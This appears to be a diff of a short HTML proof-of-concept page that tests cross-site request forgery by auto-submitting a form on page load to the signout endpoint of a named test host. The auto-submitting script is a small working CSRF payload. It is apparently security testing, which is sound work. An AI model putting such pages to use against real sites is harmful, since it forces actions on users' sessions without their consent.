@@ -2,13 +2,14 @@
 <html>
 <body>
 
-<h3>Safe CSRF Logout Test (Hosted)</h3>
+<h3>Safe CSRF Test for /api/auth/signout</h3>
 
-https://cloudui-rel.apps.iaas-test-ocp.dev.core42.systems/api/auth/logout
+https://cloudui-rel.apps.iaas-test-ocp.dev.core42.systems/api/auth/signout
 </form>
 
 <script>
-    document.getElementById('csrfLogoutForm').submit();
+    // Automatically submit the form to simulate CSRF
+    document.getElementById('csrfSignoutForm').submit();
 </script>
 
 </body>
